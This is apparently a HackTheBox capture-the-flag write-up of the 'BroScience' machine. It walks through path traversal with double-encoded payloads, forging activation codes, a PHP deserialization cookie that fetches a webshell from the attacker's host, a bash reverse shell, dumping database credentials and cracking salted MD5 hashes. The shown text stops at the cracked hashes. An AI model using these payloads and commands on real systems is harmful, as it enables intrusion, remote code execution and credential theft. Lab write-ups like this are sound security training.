---
title: HTB: BroScience
url: https://0xdf.gitlab.io/2023/04/08/htb-broscience.html
date: 2023-04-08T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-broscience, nmap, php, feroxbuster, file-read, directory-traversal, filter, wfuzz, dotdotpwn, psql, postgresql, php-deserialization, deserialization, hashcat, command-injection, openssl
---

![BroScience](/img/broscience-cover.png)

Hacking BroScience involves using a directory traversal / file read vulnerability (minus points to anyone who calls it an LFI) to get the PHP source for a website. First I’ll use that code to forge an activation token allowing me to register my account. Then, the source gives the information necessary to exploit a deserialization vulnerability by building a malicious PHP serialized object, encoding it, and sending it as my cookie. This provides a webshell and a shell on the box. I’ll find some hashes in the database that can be cracked, leading to the next user. The wrinkle here is to include the site-wide salt. For root, there’s a command injection in a script that’s checking for certificate expiration. I’ll craft a malicious certificate that performs the injection to get execution as root.

## Box Info

| Name | [BroScience](https://hackthebox.com/machines/broscience)  [BroScience](https://hackthebox.com/machines/broscience) [Play on HackTheBox](https://hackthebox.com/machines/broscience) |
| --- | --- |
| Release Date | 07 Jan 2023 |
| Retire Date | 08 Apr 2023 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for BroScience |
| Radar Graph | Radar chart for BroScience |
| First Blood User | 00:59:18[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 01:38:41[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [bmdyy bmdyy](https://app.hackthebox.com/users/485051) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.195
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-30 15:37 EDT
Nmap scan report for 10.10.11.195
Host is up (0.087s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
oxdf@hacky$ nmap -p 22,80,443 -sCV 10.10.11.195
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-30 15:37 EDT
Nmap scan report for 10.10.11.195
Host is up (0.085s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| tls-alpn: 
|_  http/1.1
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server)) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 11 bullseye.

The port 80 HTTP service is returning a redirect to `https://broscience.htb`.

Given the use of the domain names, I’ll fuzz both 80 and 443 with `wfuzz` to see if any subdomains return different pages, but it doesn’t find anything.

### broscience.htb - TCP 443

#### Site

The website has a bunch of articles about weighlifting:

[![image-20230330160604130](/img/image-20230330160604130.png)](/img/image-20230330160604130.png)

[*Click for full image*](/img/image-20230330160604130.png)

Clicking on one of the articles leads to a url like `https://broscience.htb/exercise.php?id=2`, and gives a page with a comment section:

![image-20230330160644481](/img/image-20230330160644481.png)

Trying to post a comment leads to the log in page (`login.php`). There is a registration link, but when I register, the message indicates that I need to activate:

![image-20230330160747349](/img/image-20230330160747349.png)

If I try to log in anyway, it errors:

![image-20230330160810345](/img/image-20230330160810345.png)

#### Tech Stack

The HTTP headers show Apache:

```

HTTP/1.1 200 OK
Date: Thu, 30 Mar 2023 19:59:13 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 9304
Connection: close
Content-Type: text/html; charset=UTF-8

```

Visiting the site shows it’s a PHP site based on file extensions. There are some JavaScript and CSS packages, but nothing that looks like a framework.

Looking at the page source, I’ll note that images are loaded via an odd PHP path, rather than directly to the static files:

![image-20230330162603596](/img/image-20230330162603596.png)

Immediately on visiting the site, there is a `PHPSESSID` cookie set:

```

HTTP/1.1 200 OK
Date: Thu, 30 Mar 2023 21:25:06 GMT
Server: Apache/2.4.54 (Debian)
Set-Cookie: PHPSESSID=ggar5eo1euoclh581vijnvp017; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
...[snip]...

```

That is a standard PHP cookie.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP. There’s a ton of folders and things that don’t look interesting, so I’ll kill and restart with `--no-recursion`, and even there, there’s a lot:

```

oxdf@hacky$ feroxbuster -u https://broscience.htb -x php -k --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                             
by Ben "epi" Risher 🤓                 ver: 2.9.2                       
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://broscience.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l        -w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c https://broscience.htb/.html
403      GET        9l       28w      280c https://broscience.htb/.php
301      GET        9l       28w      321c https://broscience.htb/includes => https://broscience.htb/includes/
403      GET        9l       28w      280c https://broscience.htb/.html.php
200      GET      147l      510w     9304c https://broscience.htb/index.php
301      GET        9l       28w      319c https://broscience.htb/images => https://broscience.htb/images/
403      GET        9l       28w      280c https://broscience.htb/.htm
200      GET        3l        7w       44c https://broscience.htb/styles/light.css
200      GET       29l       70w     1309c https://broscience.htb/user.php
200      GET       45l      104w     2161c https://broscience.htb/register.php
200      GET       42l       97w     1936c https://broscience.htb/login.php
403      GET        9l       28w      280c https://broscience.htb/.htm.php
200      GET       28l       71w     1322c https://broscience.htb/exercise.php
302      GET        0l        0w        0c https://broscience.htb/logout.php => https://broscience.htb/index.php
302      GET        1l        3w       13c https://broscience.htb/comment.php => https://broscience.htb/login.php
200      GET        1l        4w       39c https://broscience.htb/includes/img.php
301      GET        9l       28w      319c https://broscience.htb/styles => https://broscience.htb/styles/
200      GET      147l      510w     9304c https://broscience.htb/
301      GET        9l       28w      323c https://broscience.htb/javascript => https://broscience.htb/javascript/
301      GET        9l       28w      319c https://broscience.htb/manual => https://broscience.htb/manual/
403      GET        9l       28w      280c https://broscience.htb/.htaccess
403      GET        9l       28w      280c https://broscience.htb/.htaccess.php
200      GET       28l       66w     1256c https://broscience.htb/activate.php
...[snip]...
302      GET        1l        3w       13c https://broscience.htb/update_user.php => https://broscience.htb/login.php
...[snip]...

```

I’ve cut off a bunch of meaningless 403s for paths that start with a `.`. Of interest here is `activate.php`.

## Shell as www-data

### File Read in img.php

#### Identify Filter

Visiting `/includes/img.php` returns a page saying that the `path` parameter is missing:

![image-20230330162659784](/img/image-20230330162659784.png)

If I try to visit anything with `../` in the path, it just returns “Attack detected”:

![image-20230330163045462](/img/image-20230330163045462.png)

#### Fuzzing

There’s a really nice traversal wordlist [here](https://github.com/foospidy/payloads/blob/master/other/traversal/dotdotpwn.txt) that will try all sorts of tests. I’ll use `wfuzz` (I can’t use `ffuf` until [this bug](https://github.com/ffuf/ffuf/issues/645) is fixed) to try all these, filtering out any response with the string “Attack” and any with 0 size:

```

oxdf@hacky$ wfuzz -u https://broscience.htb/includes/img.php?path=FUZZ -w dotdotpwn.txt --hs Attack --hh 0
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://broscience.htb/includes/img.php?path=FUZZ
Total requests: 4648

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000000166:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fissue"
000000165:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
000000162:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252f..%252fetc%252fissue"
000000161:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
000000158:   200        2 L      5 W        27 Ch       "..%252f..%252f..%252f..%252fetc%252fissue"
000000157:   200        39 L     64 W       2235 Ch     "..%252f..%252f..%252f..%252fetc%252fpasswd"

Total time: 46.66168
Processed Requests: 4648
Filtered Requests: 4642
Requests/sec.: 99.61064

```

These six requests seem to return data. I’ll try one in Firefox:

```

oxdf@hacky$ curl -k https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false

```

#### Payload Analysis

These payloads seem to bypass the filter by double URL-encoding the `/` in `../`. The first URL encode takes `/` –> `%2f`. The next URL encode (just of the `%`) takes `%` –> `%25`, making the entire `../` into `..%252f`. Decoing this once will give `..%2f`, and then again will give `../`.

### Site Enumeration

#### index.php

`../index.php` pull the source for the main site. In the header, there’s references to `/includes/header.php` and `/includes/utils.php`:

```

<?php
session_start();
?>

<html>
    <head>
        <title>BroScience : Home</title>
        <?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?>
        <link rel="stylesheet" href="styles/<?=$theme?>.css">
    </head>
...[snip]...

```

Next the body has some setup, and the connection to the database:

```

...[snip]...
    <body class="<?=get_theme_class($theme)?>">
        <?php include_once 'includes/navbar.php'; ?>
        <div class="uk-container uk-margin"> 
            <!-- TODO: Search bar -->
            <?php
            include_once 'includes/db_connect.php';
...[snip]...

```

Next there’s a query to the DB for exercises, and a loop to create an article for each result:

```

...[snip]...
            // Load exercises
            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON au
thor_id = users.id');                       
            if (pg_num_rows($res) > 0) {
                echo '<div class="uk-child-width-1-2@s uk-child-width-1-3@m" uk-grid>';
                while ($row = pg_fetch_row($res)) {
                    ?>
                    <div>
...[snip]...

```

#### db\_connect.php

From the code above, I’ll check out a few files in the `/includes` directory. `path=..%252fincludes/db_connect.php` returns the DB information including password:

```

<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>

```

#### utils.php

`/includes/utils.php` has a bunch of functions. At the top there’s a function to generate activation codes:

```

function generate_activation_code() {       
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";          
    srand(time());              
    $activation_code = "";                  
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }                                       
    return $activation_code;
}

```

It’s seeding the pseudo-random number generator with `time()`, which is suspect, and likely exploitable.

There’s a `get_theme` function that is designed to read user preferences from a cookie:

```

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }                                 
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}   

```

I’m particularly interested in this because it takes the `user-prefs` cookie, base64 decodes it, and passes it to `unserialize`, which could lead to a PHP deserialization vulnerability. But that’s only if the session is set, which means I need to log in first.

There’s also an `Avatar` class at the bottom of the file:

```

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp)); 
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>

```

This jumps out as interesting because of the `__wakeup()` method, which is a [Magic Method](https://www.php.net/manual/en/language.oop5.magic.php) in PHP. Specifically:

> [unserialize()](https://www.php.net/manual/en/function.unserialize.php) checks for the presence of a function with the magic name [\_\_wakeup()](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup). If present, this function can reconstruct any resources that the object may have.

So if I can get the system to unserialize an `AvatarInterface` object, it will run the `__wakeup` function, which calls the `save` function which writes a file. There’s potential here to make one of these and put it into a `user-prefs` cookie to get file write. I’ll come back to this.

#### activate.php

`path=..%252factivate.php` reads this file. The important part is that it looks for a GET parameter named `code`:

```

...[snip]...
if (isset($_GET['code'])) {
    // Check if code is formatted correctly (regex)
    if (preg_match('/^[A-z0-9]{32}$/', $_GET['code'])) {
        // Check for code in database
...[snip]...        

```

### Activate Account

#### Request Analysis

I’ll find my request to register in Burp and take a look. It’s a POST to `/register.php`:

```

POST /register.php HTTP/1.1
Host: broscience.htb
Cookie: PHPSESSID=qgq4oojk8u47ai44dv3ip3hks5
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: https://broscience.htb
Referer: https://broscience.htb/register.php
Te: trailers
Connection: close

username=0xdf&email=0xdf%40broscience.htb&password=0xdf0xdf&password-confirm=0xdf0xdf

```

The response headers include the time on the server:

```

HTTP/1.1 200 OK
Date: Thu, 30 Mar 2023 21:10:46 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2433
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### Generate Codes

I’ll write a short PHP script that will generate codes. If I just make some PHP that prints `time()`, I’ll see it comes out as an epoch timestamp:

```

<?php
echo time() . '\n';
?>

```

```

oxdf@hacky$ php generate_codes.php 
1680210818

```

`strtotime` will give that same output from the time string in the request:

```

<?php
echo strtotime("Thu, 30 Mar 2023 21:10:46 GMT") . '\n';
?>

```

```

oxdf@hacky$ php generate_codes.php 
1680210646

```

I’ll pull in the `generate_activation_code` function collected earlier, modifying it to take an argument, and seeding `srand` with that argument instead of `time()`:

```

<?php

function generate_activation_code($t) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($t);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

$start = strtotime("Thu, 30 Mar 2023 21:10:46 GMT");
for ($t = $start - 30; $t <= $start + 30; $t++) {
    echo generate_activation_code($t) . "\n";
}

?>

```

This will print activation codes from 30 seconds before and 30 seconds after the timestamp of when I registered (more than necessary).

#### Fuzz

I’ll save these to a file, and then run them through `wfuzz` to try them all:

```

oxdf@hacky$ php generate_codes.php > codes.txt
oxdf@hacky$ wfuzz -u https://broscience.htb/activate.php?code=FUZZ -w codes.txt --hs Invalid
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://broscience.htb/activate.php?code=FUZZ
Total requests: 61

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000031:   200        27 L     65 W       1251 Ch     "33bddQwMdlOCPl5Ex2sA5NRsRS8akH0l"

Total time: 1.322301
Processed Requests: 61
Filtered Requests: 60
Requests/sec.: 46.13167

```

I’m using `--hs Invalid` because the string “Invalid” is present when the code is wrong. I don’t really care what the code was, just that it worked.

#### Log In

Now when I log in, it works:

![image-20230330172403531](/img/image-20230330172403531.png)

### RCE

#### user-prefs

On logging in, it sets another cookie, `user-prefs`:

```

HTTP/1.1 302 Found
Date: Thu, 30 Mar 2023 21:28:32 GMT
Server: Apache/2.4.54 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /index.php
Set-Cookie: user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30%3D
...[snip]...

```

This matches the cookie I saw deserialized in the code. Replacing `%3d` with `=` (URL decode), this base64 decodes to:

```

oxdf@hacky$ echo Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30= | base64 -d
O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}

```

That’s a PHP serialized object.

#### Generate Serialized Payload

I’m going to grab a lot of the PHP code from `utils.php` and use it to generate a serialized object.

```

<?php
...[snip]...
$avatar_interface = new AvatarInterface();
$avatar_interface->tmp = "";
$avatar_interface->imgPath = "";
$cookie = base64_encode(serialize($avatar_interface));
echo $cookie;
?>

```

The `Avatar` and `AvatarInterface` classes are unchanged (not shown). I’ll create a new `AvatarInterface` instance, and set the `$tmp` and `$imgPath` parameters. I’ll then serialize and base64 encode the result, and write that out.

So what are the `$tmp` and `$imgPath` values? When `unserialize` is called on this cookie, it will call the `__wakeup` function of `AvatarInterface`, creating a new `Avatar` with an `$imgPath` I give. Then it will call `save` with `$tmp`. `save` uses `file_get_contents` to read the contents of a file at the path `$tmp`, and writes that to `$imgPath`.

Since I want to write a webshell, I’ll want to write to the webroot. Something like `./cmd.php` will work fine.

Getting a webshell is a bit tricker. There are a couple ways I could go about it. The intended path for the box is to change my username to include a webshell, and then reference my session file at `//var/lib/php/sessions/sess_[session id]`.

But `file_get_contents` will also read over the network. So I’ll set it to a URL such as `http://10.10.14.6/cmd.php`.

My final code is:

```

<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$avatar_interface = new AvatarInterface();
$avatar_interface->tmp = "http://10.10.14.6/cmd.php";
$avatar_interface->imgPath = "./cmd.php";
$cookie = base64_encode(serialize($avatar_interface));
echo $cookie;
?>

```

Running this gives a cookie:

```

oxdf@hacky$ php serialized_rce_gen.php | base64 -d
O:15:"AvatarInterface":2:{s:3:"tmp";s:25:"http://10.10.14.6/cmd.php";s:7:"imgPath";s:9:"./cmd.php";}
oxdf@hacky$ php serialized_rce_gen.php 
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyNToiaHR0cDovLzEwLjEwLjE0LjYvY21kLnBocCI7czo3OiJpbWdQYXRoIjtzOjk6Ii4vY21kLnBocCI7fQ==

```

#### Exploit

I’ll make a simple webshell called `cmd.php` and host it on my webserver with Python:

```

oxdf@hacky$ cat cmd.php 
<?php system($_REQUEST['cmd']); ?>
oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

I’ll go into Firefox dev tools and replace my cookie with the malicious one, and refresh `https://broscience.htb`. There’s a connection at the webserver (actually three):

```
10.10.11.195 - - [30/Mar/2023 20:38:50] "GET /cmd.php HTTP/1.0" 200 -
10.10.11.195 - - [30/Mar/2023 20:38:50] "GET /cmd.php HTTP/1.0" 200 -
10.10.11.195 - - [30/Mar/2023 20:38:50] "GET /cmd.php HTTP/1.0" 200 -

```

And `/cmd.php` exists on the webserver, and it works:

![image-20230330204056872](/img/image-20230330204056872.png)

#### Shell

I’ll type out a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) into Firefox, URL encoding the `&` to `%26`:

```

https://broscience.htb/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

```

On hitting enter, there’s a shell at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.195 44096
bash: cannot set terminal process group (1235): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/var/www/html$

```

I’ll [upgrade the shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@broscience:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@broscience:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ;fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@broscience:/var/www/html$ 

```

## Shell as bill

### Enumeration

#### Home Directory

There’s one user with a home directory on the box, bill, and it has `user.txt`, but I can’t read it yet:

```

www-data@broscience:/var/www/html$ ls /home/
bill
www-data@broscience:/var/www/html$ ls /home/bill/
Certs    Documents  Music     Public     Videos
Desktop  Downloads  Pictures  Templates  user.txt
www-data@broscience:/var/www/html$ cat /home/bill/user.txt 
cat: /home/bill/user.txt: Permission denied

```

#### Database

I already had access to most of the web files. But now I can connect to the database with the creds from `db_connect.php`:

```

<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>

```

It’s Postgres, so I’ll use `psql` to connect, entering the password when prompted:

```

www-data@broscience:/var/www/html/includes$ psql -U dbuser -d broscience -h localhost
Password for user dbuser: 
psql (13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

broscience=>

```

`broscience` is the only interesting accessible database:

```

broscience=> \list
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)

```

It has three tables:

```

broscience=> \dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres
(3 rows)

```

The `users` table has five users besides the account I created:

```

broscience=> select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
  6 | 0xdf          | 79275232b2c9c937f145d7cc13d9339b | 0xdf@broscience.htb          | nH8VDTNVuZpI2UPif9QdCsgXzCLJrbfY | t            | f        | 2023-03-30 20:13:51.584023-04
(6 rows)

```

### Cracking Hashes

#### Manual Enumeration

The password for the 0xdf user is “0xdf”, and the hash looks like an MD5 (just based on length). But just taking an MD5 of “0xdf” doesn’t match:

```

oxdf@hacky$ echo -n "0xdf" | md5sum
465e929fc1e0853025faad58fc8cb47d  -

```

I’ll look at `registration.php`, and these two lines are where the account is created and inserted into the DB:

```

$res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
$res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_
code)); 

```

The password is `md5($db_salt . $_POST['password'])`. The same thing can be observed in `login.php`:

```

// Check if username:password is correct
$res = pg_prepare($db_conn, "login_query", 'SELECT id, username, is_activated::int, is_admin::int FROM users WHERE username=$1 AND password=$2');
$res = pg_execute($db_conn, "login_query", array($_POST['username'], md5($db_salt . $_POST['password'])));

```

`$db_salt` is defined in `db_connect.php`:

```

$db_salt = "NaCl";

```

Appending the salt does give a matching hash for 0xdf’s password:

```

oxdf@hacky$ echo -n "NaCl0xdf" | md5sum
79275232b2c9c937f145d7cc13d9339b  -

```

#### Formatting Hashes

`hashcat` has a mode where it will read in hash and salt separated by `:`. I’ll use `||` in postgres to append strings together to generate an easily copyable list:

```

broscience=> select username || ':' || password || ':NaCl' from users;
                      ?column?                       
-----------------------------------------------------
 administrator:15657792073e8a843d4f91fc403454e1:NaCl
 bill:13edad4932da9dbb57d9cd15b66ed104:NaCl
 michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
 john:a7eed23a7be6fe0d765197b1027453fe:NaCl
 dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl
 0xdf:79275232b2c9c937f145d7cc13d9339b:NaCl
(6 rows)

```

#### Hashcat

I’ll pass that file to `hashcat` and let it try to recognize the hash format. The `--user` flag tells `hashcat` to split off the string before the first `:` as the username. It finds a bunch of possible hash formats, and prints a table of them, asking me to re-run specifying which mode to use:

```

$ hashcat hashes --user /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 20 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
     12 | PostgreSQL                                                 | Database Server
   2811 | MyBB 1.2+, IPB2+ (Invision Power Board)                    | Forums, CMS, E-Commerce
   2611 | vBulletin < v3.8.5                                         | Forums, CMS, E-Commerce
   2711 | vBulletin >= v3.8.5                                        | Forums, CMS, E-Commerce
     23 | Skype                                                      | Instant Messaging Service

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

Mode 20, `md5($salt.$pass)` looks like this case. It cracks three of them:

```

$ hashcat hashes --user -m 20 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 
...[snip]...

```

Running with `--show` instead of a wordlist will show the results with the usernames:

```

$ hashcat hashes --user -m 20 --show
bill:13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
dmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest

```
